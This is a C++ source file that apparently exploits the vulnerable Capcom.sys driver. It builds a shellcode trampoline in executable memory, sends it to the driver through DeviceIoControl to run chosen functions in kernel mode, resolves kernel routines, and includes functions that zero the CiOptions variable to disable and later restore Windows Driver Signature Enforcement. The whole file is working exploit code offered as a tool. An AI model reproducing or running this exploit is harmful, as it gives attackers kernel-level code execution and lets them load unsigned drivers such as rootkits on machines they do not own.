#include "Capcom.h"
#include "stdio.h"
#include <intrin.h>
#include "LockedMemory.h"

#pragma comment(lib, "ntdll.lib")

namespace Capcom {
HANDLE openDevice() {
	HANDLE Capcom = CreateFileW(LR"(\\.\Htsysm72FB)",
															GENERIC_ALL,
															0,
															nullptr,
															OPEN_EXISTING,
															0,
															nullptr);
	if (Capcom == INVALID_HANDLE_VALUE)
		printf("[-] Failed to open Capcom device object\n");
	return Capcom;
}

CapcomPayload* buildPayload(fnCapcomRunFunc Func, PVOID UserData) {
	printf("[*] Building request...\n");
	printf("[*] Function: %p\n", Func);
	printf("[*] Data    : %p\n", UserData);

	CapcomPayload* Payload = (CapcomPayload *)VirtualAlloc(nullptr, sizeof(CapcomPayload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!Payload)
		printf("[-] Failed to allocate CapcomPayload\n");
	// This payload is what will be executed.
	// It will mov the CustomData into RDX and then JMP to the function
	// pointed by UserFunction
	BYTE Template[] = {
			0xE8, 0x08, 0x00, 0x00, 0x00, // CALL $+8 ; Skip 8 bytes, this puts the // UserFunction into RAX
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // UserFunction address // will be here
			0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,			 // MOV RDX, CustomData
			0x58,			 // POP RAX
			0xFF, 0x20 // JMP [RAX]
	};

	// Fill in the missing bytes
	*(UINT_PTR *)(Template + 0x5) = (UINT_PTR)Func;
	*(UINT_PTR *)(Template + 0xF) = (UINT_PTR)UserData;

	// Copy the payload into the buffer that is going to be sent
	Payload->MinusOne = Payload->Shellcode;
	CopyMemory(Payload->Shellcode, Template, sizeof(Template));
	printf("Address of Function: %p\n", &Payload->Shellcode);
	printf("Address of MinusOne: %p\n", &Payload->MinusOne);
	// Data.MinusOne = Data.Payload;
	return Payload;
}

int run(HANDLE Device, fnCapcomRunFunc Func, PVOID UserData) {
	DWORD OutputBuffer;
	DWORD BytesReturned;

	CapcomPayload *Payload = buildPayload(Func, UserData);
	auto Pointer = &Payload->Shellcode;

	if (DeviceIoControl(Device,
											IOCTL_X64,
											&Pointer,
											8,
											&OutputBuffer,
											4,
											&BytesReturned,
											nullptr))
		printf("Capcom shellcode success\n");
	VirtualFree(Payload, 0, MEM_RELEASE);
	return 0;
}
} // namespace Capcom

// Capcom shell code
namespace Shellcode {

#define SystemModuleInformation 0xB

// Data types
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
	PVOID Section;
	PVOID MappedBase;
	PVOID IMAGEBase;
	UINT32 ImageSize;
	UINT32 Flags;
	UINT16 LoadOrderIndex;
	UINT16 InitOrderIndex;
	UINT16 LoadCount;
	UINT16 OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
	UINT64 NumberOfModules;
	_RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;
typedef CCHAR KPROCESSOR_MODE;

typedef struct _SECURITY_SUBJECT_CONTEXT {
    PACCESS_TOKEN ClientToken;
    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
    PACCESS_TOKEN PrimaryToken;
    PVOID ProcessAuditId;
} SECURITY_SUBJECT_CONTEXT, *PSECURITY_SUBJECT_CONTEXT;

#define INITIAL_PRIVILEGE_COUNT         3
typedef struct _INITIAL_PRIVILEGE_SET *PINITIAL_PRIVILEGE_SET;

typedef struct _ACCESS_STATE *PACCESS_STATE;
typedef struct _OBJECT_TYPE *POBJECT_TYPE;
typedef struct _DRIVER_OBJECT *PDRIVER_OBJECT;

// Function pointers
NTSTATUS(*NtQuerySystemInformation)
(SYSTEM_INFORMATION_CLASS SystemInformationClass,
 PVOID SystemInformation,
 ULONG SystemInformationLength,
 ULONG *ReturnLength);

ULONG (*DbgPrint)(PCSTR formant, ...);

extern POBJECT_TYPE *IoDriverObjectType;

POBJECT_TYPE (*ObGetObjectType)(_In_ PVOID Object);

NTSTATUS(*ObReferenceObjectByName)
(_In_ PUNICODE_STRING ObjectPath,
 _In_ ULONG Attributes,
 _In_opt_ PACCESS_STATE PassedAccessState,
 _In_opt_ ACCESS_MASK DesiredAccess,
 _In_ POBJECT_TYPE ObjectType,
 _In_ KPROCESSOR_MODE AccessMode,
 _Inout_opt_ PVOID ParseContext,
 _Out_ PVOID *Object);

// Globals
DWORD OldCiOptions = 0;

// Functions to be run by capcom driver
NON_PAGED_CODE void NTAPI initFuncPtrs(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress,
								PVOID Data) {

	UNICODE_STRING DP;
	UNICODE_STRING OGOT;
	UNICODE_STRING OROBN;
	UNICODE_STRING NQSI;
	RtlInitUnicodeString(&DP, L"DbgPrint");
	RtlInitUnicodeString(&OGOT, L"ObGetObjectType");
	RtlInitUnicodeString(&OROBN, L"ObReferenceObjectByName");
	RtlInitUnicodeString(&NQSI, L"NtQuerySystemInformation");

	DbgPrint = (decltype(DbgPrint))MmGetSystemRoutineAddress(&DP);
  ObGetObjectType = (decltype(ObGetObjectType))MmGetSystemRoutineAddress(&OGOT);
  ObReferenceObjectByName =
      (decltype(ObReferenceObjectByName))MmGetSystemRoutineAddress(&OROBN);
  NtQuerySystemInformation =
      (decltype(NtQuerySystemInformation))MmGetSystemRoutineAddress(&NQSI);

  DbgPrint("Capcom: OGOT: %p\n", ObGetObjectType);
  DbgPrint("Capcom: OROBN: %p\n", ObReferenceObjectByName);
  DbgPrint("Capcom: NQSI: %p\n", NtQuerySystemInformation);
}

NON_PAGED_CODE void NTAPI helloWorld(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress,
											PVOID Data) {
	DbgPrint("Capcom: Hello from the otherside\n");
}

NON_PAGED_CODE void NTAPI disableDSE(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress,
											PVOID Data) {
	DbgPrint("Capcom: CiOptions offset: %llX\n", *(UINT64 *)Data);
	DWORD *CiOptions = (DWORD *)(*(UINT64 *)Data);
	OldCiOptions = *CiOptions;
	*CiOptions = 0;
	DbgPrint("Capcom: DSE disabled\n");
}
NON_PAGED_CODE void NTAPI restoreDSE(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress,
											PVOID Data) {
	DWORD *CiOptions = (DWORD *)(*(UINT64 *)Data);
	*CiOptions = OldCiOptions;
	DbgPrint("Capcom: DSE restored\n");
}
} // namespace
